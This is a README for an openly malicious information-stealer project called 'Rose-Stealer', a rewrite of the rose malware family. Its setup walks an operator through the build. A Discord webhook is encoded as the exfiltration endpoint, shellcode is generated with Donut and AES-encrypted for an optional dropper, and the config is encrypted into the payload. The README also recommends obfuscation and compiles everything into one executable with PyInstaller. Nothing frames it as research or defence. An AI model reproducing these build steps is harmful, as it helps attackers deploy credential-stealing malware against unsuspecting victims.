# 🐍 Rose-Stealer
## Rewritten version of the rose malware family.

> [!CAUTION]
> If you don't trust it, read the source.

> [!IMPORTANT]
> This is a small rewritten version for the rose implant.
> I don't provide support for this. You should know what you're doing.

## Requirements
- [Python 3.10+](https://python.org/downloads)
- Python-Libs installed (`pip install -r assets\requirements.txt`)

## Setup
#### [Download](https://github.com/0xRose/Rose-Stealer/archive/refs/heads/main.zip) the source code of this repository.
- Encode your Discord Webhook: `python utils\b85_encode.py DISCORD_WEBHOOK`
  - Place the output in the config.ini file
  ```ini
  [main]
  # base 85 encoded and hexified discord webhook
  discord_webhook=DISCORD_WEBHOOK <--- Put the encoded webhook here
  ```
- File dropper if wanted:
  - generate shellcode with [Donut](https://github.com/TheWover/donut) for an executable file to e.g. client\ `shellc.dat`
  - AES encrypt the shellcode file:
    - `python utils\aes_encrypt.py payload\shellc.dat payload\shellc.aes`
    - Copy the output key into your config.ini file like this:
    ```ini
    [shellcode_loader]
    # file path storing AES encrypted and compressed shellcode
    shellcode_file_name=shellc.aes
    # hexified 32 byte (128-bit AES key)
    shellcode_key=AES_KEY <--- Put the AES key here
    ```
- Now encrypt the config file:
  - `python utils\aes_encrypt.py payload\config.ini payload\config.aes`
  - Put the output key you received into the [malware source code](https://github.com/0xRose/Rose-Stealer/blob/main/payload/main.py) on line 380:
    ```py
    key = "AES_KEY"  # hexified 32 byte key (128-bit) <--- Put the AES key here
    ```
(Additionally i would recommend to add obfuscation on the script now.)
- You can now compile it into a binary: `pyinstaller --clean --onefile --add-data "payload\shellc.aes;." --add-data "payload\config.aes;." --hidden-import cryptography --hidden-import pywin32 --hidden-import pillow --hidden-import aiohttp payload\main.py`

**Yay! Your executable is now inside of the `dist` folder.**
